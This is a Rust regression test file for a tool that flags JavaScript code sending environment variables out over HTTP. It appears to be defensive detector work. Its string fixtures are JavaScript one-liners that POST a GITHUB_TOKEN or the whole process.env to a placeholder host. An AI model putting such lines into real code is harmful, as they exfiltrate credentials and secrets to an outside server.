//! Regression tests for JavaScript environment payload provenance.

use std::collections::BTreeSet;
use std::path::Path;

/// Kinds of the `source.payload_flow.events` reported for `source`.
fn event_kinds(source: &str) -> BTreeSet<String> {
    let parsed = filefacts::OpenOptions::new()
        .path(Path::new("index.js"))
        .open(source.as_bytes());
    parsed
        .values()
        .get("source.payload_flow.events")
        .and_then(|events| events.as_array())
        .expect("payload flow events")
        .iter()
        .map(|event| event["kind"].as_str().expect("event kind").to_string())
        .collect()
}

#[test]
fn javascript_process_env_alias_refines_properties_and_keeps_bulk_flow() {
    let config = "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify({model:env.SMALLCODE_MODEL,baseUrl:env.SMALLCODE_BASE_URL})});";
    let config_kinds = event_kinds(config);
    assert!(config_kinds.is_empty(), "{config_kinds:?}");

    let secret = "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify({token:env.GITHUB_TOKEN})});";
    let secret_kinds = event_kinds(secret);
    assert!(
        secret_kinds.contains("secret-http-body"),
        "{secret_kinds:?}"
    );
    assert!(
        !secret_kinds.contains("environment-http-body"),
        "{secret_kinds:?}"
    );

    for source in [
        "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify(env)});",
        "fetch('https://example.invalid',{method:'POST',body:JSON.stringify({...process.env})});",
    ] {
        let kinds = event_kinds(source);
        assert!(
            kinds.contains("environment-http-body"),
            "{source}: {kinds:?}"
        );
        assert!(kinds.contains("secret-http-body"), "{source}: {kinds:?}");
    }
}
